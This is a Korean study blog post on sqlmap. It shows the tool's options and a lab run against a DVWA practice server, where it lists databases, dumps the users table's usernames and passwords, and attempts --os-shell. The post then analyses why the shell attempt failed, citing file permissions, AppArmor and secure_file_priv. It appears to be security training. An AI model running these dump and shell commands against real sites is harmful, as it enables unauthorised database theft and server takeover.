---
layout: post
title: "Sqlmap 공부"
date: 2025-08-27 17:00:00 +0900
categories: [해킹 툴]
---

### 1. Sqlmap 개요

Sqlmap은 SQL Injection 취약점을 탐지하고 공격을 자동화하는 오픈소스 도구이다. 명령 줄 인터페이스(CLI) 기반으로 동작하며 데이터베이스 정보를 탈취하거나 서버의 운영체제 명령어까지 실행할 수 있는 강력한 기능을 갖추고 있다.

수동으로 하려면 매우 오래 걸리는 Blind SQL Injection과 같은 공격을 자동화하여 공격 시간을 획기적으로 단축시킨다.

---

### 2. 기본 사용법 및 옵션

#### ***기본 스캔***
`-u` 옵션으로 취약점을 점검할 URL을 지정한다. Sqlmap이 테스트할 파라미터를 URL에 포함해야 한다.
```bash
sqlmap -u "http://[Target IP]/vulnerabilities/sqli/?id=1&Submit=Submit#"
```

#### ***주요 옵션***
*   **--cookie="[COOKIE]"**: 인증이 필요한 페이지를 점검할 때 사용한다. 브라우저에서 복사한 쿠키 값을 입력한다.
*   **--dbs**: 공격 가능한 데이터베이스의 목록을 보여준다.
*   **-D [DB_NAME] --tables**: 특정 데이터베이스에 포함된 테이블 목록을 보여준다.
*   **-D [DB_NAME] -T [TABLE_NAME] --columns**: 특정 테이블에 포함된 컬럼 목록을 보여준다.
*   **-D [DB_NAME] -T [TABLE_NAME] -C [COLUMN_NAME] --dump**: 특정 컬럼의 데이터를 모두 추출하여 보여준다.
*   **--batch**: 스캔 과정에서 Sqlmap이 묻는 모든 질문에 기본값(Y)으로 자동 응답한다.

---

### 3. 사용 예시

Target 서버 `192.9.200.11`의 DVWA SQL Injection 페이지를 대상으로 데이터베이스 목록을 확인하고 사용자 정보를 탈취했다.

#### ***데이터베이스 목록 확인***
```bash
sqlmap -u "http://192.9.200.11/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=..." --dbs
```
   ![SqlmapDbs](/assets/images/Sql_1.png)

#### **`users` 테이블 데이터 탈취**
위에서 확인한 `dvwa` 데이터베이스의 `users` 테이블에서 `user`, `password` 컬럼의 내용을 탈취한다.
```bash
sqlmap -u "..." --cookie="..." -D dvwa -T users -C user,password --dump
```
   ![SqlmapDump](/assets/images/Sql_2.png)

---

### 4. 운영체제 쉘 획득 `--os-shell` 시도 및 분석

`--os-shell` 옵션은 Sqlmap의 가장 강력한 기능 중 하나로 성공 시 대상 서버의 운영체제 쉘을 획득하여 직접 명령을 내릴 수 있다. 이 기능은 SQL Injection을 통해 웹 서버의 쓰기 가능한 경로에 명령어 실행을 위한 작은 스크립트(Stager)를 업로드하는 방식으로 동작한다.

#### ***실행 명령어***
```bash
sqlmap -u "http://192.9.200.11/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="..." --os-shell
```

#### ***실행 결과 및 분석***
명령어 실행 결과 `os-shell` 획득에 실패했다. 로그 분석 결과 핵심적인 실패 원인은 `sqlmap`이 스크립트(Stager) 파일을 대상 서버의 웹 디렉터리에 업로드하지 못했기 때문으로 확인되었다.

   ![SqlmapOshellFail](/assets/images/Sql_3.png)

터미널 로그에 반복적으로 나타난 아래의 경고 메시지가 이를 명확히 보여준다.
`[WARNING] it looks like the file has not been written (usually occurs if the DBMS process user has no write privileges in the destination path)`

이러한 실패는 DVWA가 설치된 최신 리눅스 서버 환경의 다층적인 보안 설정(Defense in Depth)에 기인한 것으로 분석된다. 주요 방어 메커니즘은 다음과 같다.

*   **파일 시스템 권한:** 웹 서버의 Document Root`/var/www/html` 디렉터리는 웹 서버 사용자`www-data`에게만 쓰기 권한이 제한적으로 부여된다. SQL 쿼리를 실행하는 데이터베이스 사용자`mysql`는 이 디렉터리에 파일을 쓸 권한이 기본적으로 없다.

*   **리눅스 보안 모듈 (AppArmor):** Ubuntu와 같은 최신 배포판은 AppArmor를 통해 각 서비스(프로세스)가 허용된 경로 외에는 접근하지 못하도록 통제한다. `mysql` 프로세스는 자신의 데이터 디렉터리 외의 다른 경로에 파일을 생성하려는 시도 자체가 차단된다.

*   **데이터베이스 자체 보안 설정 `secure_file_priv`:** 최신 MySQL/MariaDB는 `secure_file_priv`라는 시스템 변수를 통해 파일 입출력을 특정 디렉터리로만 제한하거나 완전히 비활성화하는 기능을 기본적으로 제공한다. 이 설정이 활성화되어 있다면 파일 시스템 권한이 허용되더라도 데이터베이스 스스로 파일 생성을 거부한다.

결론적으로 현대의 웹 서버 환경은 기본 설정만으로도 `sqlmap`의 `--os-shell`과 같은 자동화된 파일 생성 공격을 효과적으로 방어할 수 있음을 확인했다.

<hr class="short-rule">